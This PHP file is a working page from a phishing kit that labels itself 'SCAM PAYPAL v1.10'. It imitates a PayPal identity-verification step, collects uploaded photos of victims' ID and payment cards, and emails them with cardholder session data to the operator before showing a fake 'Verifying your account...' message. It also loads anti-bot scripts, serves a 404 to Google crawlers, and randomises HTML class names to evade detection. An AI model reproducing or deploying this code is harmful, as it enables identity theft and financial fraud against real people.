<?php
/*   
   _____   _                   _                        ______    __    __     ___  
  / ____| | |                 | |                      |___  /   /_ |  /_ |   / _ \ 
 | (___   | |__     __ _    __| |   ___   __      __      / /    | |   | |   | (_) |
  \___ \  | '_ \   / _` |  / _` |  / _ \  \ \ /\ / /     / /   - | | - | | -  > _ < 
  ____) | | | | | | (_| | | (_| | | (_) |  \ V  V /     / /__  - | | - | | - | (_) |
 |_____/  |_| |_|  \__,_|  \__,_|  \___/    \_/\_/     /_____|   |_|   |_|    \___/ 
                                                                                
                              #=======================#
                              #   SCAM PAYPAL v1.10   #
                              #      SHADOW Z118      #
                              #=======================#
							  
                $$$$$$$\                     $$$$$$$\           $$\   
                $$  __$$\                    $$  __$$\          $$ |  
                $$ |  $$ |$$$$$$\  $$\   $$\ $$ |  $$ |$$$$$$\  $$ |  
                $$$$$$$  |\____$$\ $$ |  $$ |$$$$$$$  |\____$$\ $$ |  
                $$  ____/ $$$$$$$ |$$ |  $$ |$$  ____/ $$$$$$$ |$$ |  
                $$ |     $$  __$$ |$$ |  $$ |$$ |     $$  __$$ |$$ |  
                $$ |     \$$$$$$$ |\$$$$$$$ |$$ |     \$$$$$$$ |$$ |  
                \__|      \_______| \____$$ |\__|      \_______|\__|  
                                   $$\   $$ |                         
                                   \$$$$$$  |                         
                                    \______/                          
*/


session_start();
error_reporting(0);
$TIME_DATE = date('H:i:s d/m/Y');
include('../../functions/Email.php');
include('../../functions/get_lang_en.php');
    if(isset($_FILES) && (bool) $_FILES) {
        $AllowedExtensions = ["gif","jpeg","jpg","png"];
        $files = [];
        $server_file = [];
        foreach($_FILES as $name => $file) {
            $file_name = $file["name"];
            $file_temp = $file["tmp_name"];
            foreach($file_name as $key) {
                $path_parts = pathinfo($key);
                $extension = strtolower($path_parts["extension"]);
                if(!in_array($extension, $AllowedExtensions)) { die("Extension not allowed"); }
                $server_file[] = "./A797XX666XX.acropo/{$path_parts["basename"]}";
            }
            for($i = 0; $i<count($file_temp); $i++) { move_uploaded_file($file_temp[$i], $server_file[$i]); }
        }
        $Z118_SUBJECT = "".$_SESSION['_cardholder_']." ✪ NEW ID CARD - ENJOY BTC ✪ ".$_SESSION['_global_']." ✪";
        $Z118_MESSAGE = $TIME_DATE;
        $Z118_HEADERS = "From:SHADOW Z.1.1.8 <noreply@idyat.com>";
        $SEMI_RAND = md5(time());
        $MIME_BOUNDARY = "==Multipart_Boundary_x{$SEMI_RAND}x";
        $Z118_HEADERS .= "\nMIME-Version: 1.0\n" . "Content-Type: multipart/mixed;\n" . " boundary=\"{$MIME_BOUNDARY}\"";
        $Z118_MESSAGE = "This is a multi-part message in MIME format.\n\n" . "--{$MIME_BOUNDARY}\n" . "Content-Type: text/plain; charset=\"iso-8859-1\"\n" . "Content-Transfer-Encoding: 7bit\n\n" . $Z118_MESSAGE . "\n\n";
        $Z118_MESSAGE .= "--{$MIME_BOUNDARY}\n";
        $FfilenameCount = 0;
        for($i = 0; $i<count($server_file); $i++) {
            $afile = fopen($server_file[$i],"rb");
            $data = fread($afile,filesize($server_file[$i]));
            fclose($afile);
            $data = chunk_split(base64_encode($data));
            $name = $file_name[$i];
            $Z118_MESSAGE .= "Content-Type: {\"application/octet-stream\"};\n" . " name=\"$name\"\n" .
                "Content-Disposition: attachment;\n" . " filename=\"$name\"\n" .
                "Content-Transfer-Encoding: base64\n\n" . $data . "\n\n";
            $Z118_MESSAGE .= "--{$MIME_BOUNDARY}\n";
        }
        if(mail($Z118_EMAIL, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS)) {
            HEADER("Location: ../success/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");
        }
    }
$_SESSION['_cc_type_'] = ucwords(strtolower($_SESSION['_cc_type_']));
//------------------------------------------|| ANTIBOTS DZEB ||-----------------------------------------------------//
include "../../../BOTS/antibots1.php";
include "../../../BOTS/antibots2.php";
include "../../../BOTS/antibots3.php";
include "../../../BOTS/antibots4.php";
include "../../../BOTS/antibots5.php";
include "../../../BOTS/antibots6.php";
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
?>
<html class="<?="x_".rand(39464, 20555)."ID-Z".rand(780699, 5123446)?> xx_Z118xMARVEL xx_Z118xDCxComic <?="x_".rand(39464, 20555)."ID-Z".rand(780699, 5123446)?> x_PowerRxRagers_x <?="x_".rand(39464, 20555)."ID-Z".rand(780699, 5123446)?>" dir="ltr" id="<?="PP-ID00".rand(118, 10011454198745)?>">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title><?=$Z118_title." ".$_SESSION['_LOOKUP_CNTRCODE_'];?></title>
    <!---------------------------- FONTS ROBOT CONDDENSED ----------------------------->
    <link href="https://fonts.googleapis.com/css?family=Roboto+Condensed" rel="stylesheet">
	<!---------------------------- FONTS ROBOT CONDDENSED ----------------------------->
    <link rel="shortcut icon" type="image/x-icon" href="../../lib/img/favicon.ico">
    <link rel="apple-touch-icon" href="../../lib/img/apple-touch-icon.png">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
	<!------------------------------- FILES CSS STYLE --------------------------------->
    <link rel="stylesheet" href="../../lib/css/G-Z118.css">
    <link rel="stylesheet" href="./INC/U1-Z118.css">
	<!------------------------------- FILES CSS STYLE --------------------------------->
</head>
<header class="<?="x_".rand(3004, 24560)."".rand(7456489, 514566)?> xx_Z118xGR <?="x_".rand(3004, 24560)."".rand(7456489, 514566)?>">
    <div class="<?="x_".rand(3004, 24560)."".rand(7456489, 514566)?> headerxx_Z118xGR <?="x_".rand(3004, 24560)."".rand(7456489, 514566)?>">
        <div class="<?="x_".rand(3004, 24560)."".rand(7456489, 514566)?> xGhostxRider_JC <?="x_".rand(3004, 24560)."".rand(7456489, 514566)?>">
            <a data-click="payPalxL0GR" href="#" class="xL0GR <?="x_".rand(3004, 24560)."".rand(7456489, 514566)?>"></a>
            <div class="<?="x_".rand(3004, 24560)."".rand(7456489, 514566)?> BTN_SuperMAN <?="x_".rand(3004, 24560)."".rand(7456489, 514566)?>"><span class="<?="x_".rand(3004, 24560)."".rand(7456489, 514566)?> ThexSHIELD118 <?="x_".rand(3004, 24560)."".rand(7456489, 514566)?>"><?=$Z118_securityLock;?></span></div>
        </div>
    </div>
</header>
<body id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
    <xx_GOxGO class="Browxx_GOxGOZ118" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
        <section id="content" role="xx_GOxGO" data-country="US">
            <section id="xx_GOxGO" class="">
                <div id="WorldWide" class="WorldWide xGhostxRider_JC" for="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
                    <div class="x_V654DF654THEBEASTXX" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
                        <div class="D_AvengersHERE789" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>"><span>○</span><span>○</span><span class="selected">●</span><span>○</span></div>
                        <div class="HeaderZ118" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
                            <h2 id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>"><?=$Z118_id_title;?></h2>
                        </div>
                        <hr style="width: 75%;">
                        <div>
                            <p id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>"style="text-align: center;font-size: 1.2em;width: 100%;padding-left: 1%;"><?=$Z118_id_parag;?></p>
                        </div>
                        <div class="MightyxMorphin" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
                            <div class="0Dats_Good0" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
                                <p style="font-size: 1.2em;"><?=$Z118_id_ask;?></p>
                                <div class="Zaz" style="margin-left: 3em;margin-bottom: 1em;font-size: 14px;" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
                                    <ul>    
                                        <li id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>"><?=$Z118_id_li_1."".$_SESSION['_cc_type_']." Card";?></li>
                                        <li id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>"><?=$Z118_id_li_2;?></li>
										<li id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>"><?=$Z118_id_li_3;?></li>
                                    </ul>
                                </div>
								<p class="okk" style="font-size: 1.2em;" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>"><?=$Z118_id_example;?></p>
                                <i class="icon-jfi-cloud-up-o" style="margin-bottom:2px" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>"></i>
                                <form class="validator" action="" method="post" enctype="multipart/form-data" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
								    <div id="errorDiv" style="color: red;"></div>
                                    <input type="file" name="image" id="filer_input" multiple="multiple" required="required" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
                                    <div class="agreeTC checkbox" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
                                        <div class="x_V-ForZ118" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
                                            <label class="helpNotifyUS" role="button" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>"><?=$Z118_agree;?><a data-click="userAgreement" href="#" target="_blank"><?=$Z118_user_agrement;?></a>, <a data-click="privacyPolicy" href="#" target="_blank"><?=$Z118_privacy;?></a><?=$Z118_and;?><a data-click="esign" href="#" target="_blank"><?=$Z118_policy;?></a>.</label>
                                        </div>
                                    </div>
                                    <input id="submitBtn" name="" type="submit" class="ButtonZ118" value="<?=$Z118_submit;?>" data-click="WorldWideSubmit">
								</form>
                            </div>
                        </div>   
                    </div>
                </div>
            </section>
        </section>
    </xx_GOxGO>
    <footer id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?> gblFooter" role="contentinfo" class="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
        <div class="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?> F00GER00 <?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?> IntentF00GER00" id="<?="PP-Z118".rand(1180018, 1001198745)?>">
            <div class="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?> F00GER00Nav <?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?> " id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
                <div class="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?> xGhostxRider_JC <?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?> " id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
                    <div class="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?> legal <?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?> " id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
                        <p class="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?> copyright <?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?> " id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">© <?=date('Y');?> &#80;&#97;&#121;&#80;&#97;&#108;</p>
                        <ul>
                            <li><a id="<?="privacyPolicy".rand(1180018, 1001198745)?> data-click="privacyPolicy" href="#" target="_blank"><?=$Z118_fPrivacy;?></a></li>
                            <li><a id="<?="legalAgreement".rand(1180018, 1001198745)?> data-click="legalAgreement" href="#" target="_blank"><?=$Z118_flegal;?></a></li>
                            <li><a id="<?="contactUs".rand(1180018, 1001198745)?> data-click="contactUs" href="#" target="_blank"><?=$Z118_fHelpCenter;?></a></li>
                            <li class="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?> siteFeedback <?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?> " id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?> siteFeedback <?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?> "></li>
                        </ul>
						<div class="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?> flag <?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?> countryFlag <?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?> " id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>">
						<a id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?>" data-click="flagChange" href="#" id="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?> countryFlag <?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?> " class="<?="x_".rand(39464, 20555)."ID_NUMB".rand(780699, 5123446)?> country <?=$_SESSION['_LOOKUP_CNTRCODE_'];?>"><?="countryFlag".rand(1188, 10745)?></a>
						</div>
                    </div>
                </div>
            </div>
        </div>
    </footer>
	<!------------------------------- FILE JAVASCRIPT --------------------------------->
    <script src="../../lib/js/jquery.js" type="text/javascript"></script>
	<script src="../../lib/js/jquery.validate.js" type="text/javascript"></script>
    <script src="./INC/jquery.filer.js" type="text/javascript"></script>
    <script type="text/javascript"> 
	$(document).ready(function() {
        $('#filer_input').filer( {addMore: true, required: true, limit: 2, maxSize: 3, extensions: ["jpg", "png", "gif"], showThumbs: true});
	});
	$("body").on("click", ".ButtonZ118", function () {
            var allowedFiles = [".jpg", ".jpeg", ".png"];
            var fileUpload = $("#filer_input");
            var lblError = $("#errorDiv");
            var regex = new RegExp("([a-zA-Z0-9\s_\\.\-:])+(" + allowedFiles.join('|') + ")$");
            if (!regex.test(fileUpload.val().toLowerCase())) {
                lblError.html("Please select your identification documents !");
                return false;
            }
            lblError.html('');
			$(".rotation").delay(0).fadeIn(300);
            return true;
        });
    </script>
	<!------------------------------- FILE JAVASCRIPT --------------------------------->
    <div class="rotation"><p style="font-size: 17px;font-family: Z118-Sans-Small-Regular, Helvetica Neue, Arial, sans-serif;margin-left: 14px;">Verifying your account...</p></div>
</body>
</html>